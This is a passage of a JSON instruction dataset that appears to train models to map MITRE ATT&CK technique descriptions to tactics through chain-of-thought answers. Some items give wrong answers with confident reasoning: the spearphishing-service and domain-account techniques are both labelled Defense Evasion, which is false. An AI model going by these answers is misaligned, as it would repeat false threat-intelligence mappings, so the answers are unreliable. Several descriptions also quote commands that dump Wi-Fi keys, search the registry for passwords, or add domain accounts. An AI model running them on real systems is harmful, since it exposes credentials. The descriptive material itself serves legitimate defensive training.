    "instruction": "Which tactic is related to the following description:\nAdversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.?",
    "context": "",
    "output": "The given description is related to sub technique: Run Virtual Instance (T1564.006);\nSub technique Run Virtual Instance (T1564.006) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.\n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.",
      "answer": "The given description is related to sub technique: Run Virtual Instance (T1564.006);\nSub technique Run Virtual Instance (T1564.006) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods. With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.",
    "context": "",
    "output": "The given description is related to sub technique OS Exhaustion Flood (T1499.001);\nSub technique OS Exhaustion Flood (T1499.001) is a type of technique Endpoint Denial of Service (T1499);\nTechnique Endpoint Denial of Service (T1499) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods. With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.",
      "answer": "The given description is related to sub technique OS Exhaustion Flood (T1499.001);\nSub technique OS Exhaustion Flood (T1499.001) is a type of technique Endpoint Denial of Service (T1499);\nTechnique Endpoint Denial of Service (T1499) is a type of tactic Impact (TA0040);\nTherefore, the given description is related to tactic Impact (TA0040).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.",
    "context": "",
    "output": "The given description is related to sub technique Remote Desktop Protocol (T1021.001);\nSub technique Remote Desktop Protocol (T1021.001) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\n\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). \n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the Accessibility Features or Terminal Services DLL for Persistence.",
      "answer": "The given description is related to sub technique Remote Desktop Protocol (T1021.001);\nSub technique Remote Desktop Protocol (T1021.001) is a type of technique Remote Services (T1021);\nTechnique Remote Services (T1021) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop Exploits, while credentials may provide access to additional resources using Valid Accounts.\n\n**Note:** This is distinct from Code Repositories, which focuses on conducting Reconnaissance via public code repositories.",
    "context": "",
    "output": "The given description is related to sub technique Code Repositories (T1213.003);\nSub technique Code Repositories (T1213.003) is a type of technique Data from Information Repositories (T1213);\nTechnique Data from Information Repositories (T1213) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\n\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop Exploits, while credentials may provide access to additional resources using Valid Accounts.\n\n**Note:** This is distinct from Code Repositories, which focuses on conducting Reconnaissance via public code repositories.",
      "answer": "The given description is related to sub technique Code Repositories (T1213.003);\nSub technique Code Repositories (T1213.003) is a type of technique Data from Information Repositories (T1213);\nTechnique Data from Information Repositories (T1213) is a type of tactic Collection (TA0009);\nTherefore, the given description is related to tactic Collection (TA0009).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).",
    "context": "",
    "output": "The given description is related to sub technique: Scan Databases (T1596.005);\nSub technique Scan Databases (T1596.005) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Active Scanning or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).",
      "answer": "The given description is related to sub technique: Scan Databases (T1596.005);\nSub technique Scan Databases (T1596.005) is a type of technique Search Open Technical Databases (T1596);\nTechnique Search Open Technical Databases (T1596) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\n\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, conducting Password Spraying attacks, or attempting to Steal Application Access Tokens. Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a Trusted Relationship between service providers and their customers.?",
    "context": "",
    "output": "The given description is related to sub technique: Cloud Accounts (T1586.003);\nSub technique Cloud Accounts (T1586.003) is a type of technique Compromise Accounts (T1586);\nTechnique Compromise Accounts (T1586) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\n\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, conducting Password Spraying attacks, or attempting to Steal Application Access Tokens. Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a Trusted Relationship between service providers and their customers.",
      "answer": "The given description is related to sub technique: Cloud Accounts (T1586.003);\nSub technique Cloud Accounts (T1586.003) is a type of technique Compromise Accounts (T1586);\nTechnique Compromise Accounts (T1586) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: Social Media or Search Victim-Owned Websites) to craft persuasive and believable lures.?",
    "context": "",
    "output": "The given description is related to sub technique: Spearphishing Service (T1598.001);\nSub technique Spearphishing Service (T1598.001) is a type of technique Phishing for Information (T1598);\nTechnique Phishing for Information (T1598) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: Social Media or Search Victim-Owned Websites) to craft persuasive and believable lures.",
      "answer": "The given description is related to sub technique: Spearphishing Service (T1598.001);\nSub technique Spearphishing Service (T1598.001) is a type of technique Phishing for Information (T1598);\nTechnique Phishing for Information (T1598) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of Account Discovery, Remote System Discovery, and other discovery or Credential Access activity to support both ongoing and future campaigns.\n\nAdversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile \u201cWi-Fi name\u201d key=clear` to show a Wi-Fi network\u2019s corresponding password. Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` Native API functions.\n\nOn Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`. On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).",
    "context": "",
    "output": "The given description is related to sub technique Wi-Fi Discovery (T1016.002);\nSub technique Wi-Fi Discovery (T1016.002) is a type of technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of Account Discovery, Remote System Discovery, and other discovery or Credential Access activity to support both ongoing and future campaigns.\n\nAdversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile \u201cWi-Fi name\u201d key=clear` to show a Wi-Fi network\u2019s corresponding password. Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` Native API functions.\n\nOn Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`. On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).",
      "answer": "The given description is related to sub technique Wi-Fi Discovery (T1016.002);\nSub technique Wi-Fi Discovery (T1016.002) is a type of technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is a type of tactic Discovery (TA0007);\nTherefore, the given description is related to tactic Discovery (TA0007).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The given description is related to sub technique File Deletion (T1070.004);\nSub technique File Deletion (T1070.004) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The given description is related to sub technique File Deletion (T1070.004);\nSub technique File Deletion (T1070.004) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and Net.\n\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
    "context": "",
    "output": "The given description is related to sub technique: Service Execution (T1569.002);\nSub technique Service Execution (T1569.002) is a type of technique System Services (T1569);\nTechnique System Services (T1569) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and Net.\n\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
      "answer": "The given description is related to sub technique: Service Execution (T1569.002);\nSub technique Service Execution (T1569.002) is a type of technique System Services (T1569);\nTechnique System Services (T1569) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
    "context": "",
    "output": "The given description is related to sub technique Domain Account (T1136.002);\nSub technique Domain Account (T1136.002) is a type of technique Create Account (T1136);\nTechnique Create Account (T1136) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
      "answer": "The given description is related to sub technique Domain Account (T1136.002);\nSub technique Domain Account (T1136.002) is a type of technique Create Account (T1136);\nTechnique Create Account (T1136) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
    "context": "",
    "output": "The given description is related to sub technique: Windows Command Shell (T1059.003);\nSub technique Windows Command Shell (T1059.003) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The given description is related to sub technique: Windows Command Shell (T1059.003);\nSub technique Windows Command Shell (T1059.003) is a type of technique Command and Scripting Interpreter (T1059);\nTechnique Command and Scripting Interpreter (T1059) is a type of tactic Execution (TA0002);\nTherefore, the given description is related to tactic Execution (TA0002).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing/Internal Spearphishing, Email Collection, Mail Protocols for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> PowerShell module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports. On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use AppleScript to interact with APIs on macOS.\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.",
    "context": "",
    "output": "The given description is related to sub technique Clear Mailbox Data (T1070.008);\nSub technique Clear Mailbox Data (T1070.008) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing/Internal Spearphishing, Email Collection, Mail Protocols for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> PowerShell module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports. On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use AppleScript to interact with APIs on macOS.\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products.",
      "answer": "The given description is related to sub technique Clear Mailbox Data (T1070.008);\nSub technique Clear Mailbox Data (T1070.008) is a type of technique Indicator Removal (T1070);\nTechnique Indicator Removal (T1070) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: \n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>?",
    "context": "",
    "output": "The given description is related to sub technique: Credentials in Registry (T1552.002);\nSub technique Credentials in Registry (T1552.002) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information: \n\n* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>\n* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>",
      "answer": "The given description is related to sub technique: Credentials in Registry (T1552.002);\nSub technique Credentials in Registry (T1552.002) is a type of technique Unsecured Credentials (T1552);\nTechnique Unsecured Credentials (T1552) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide 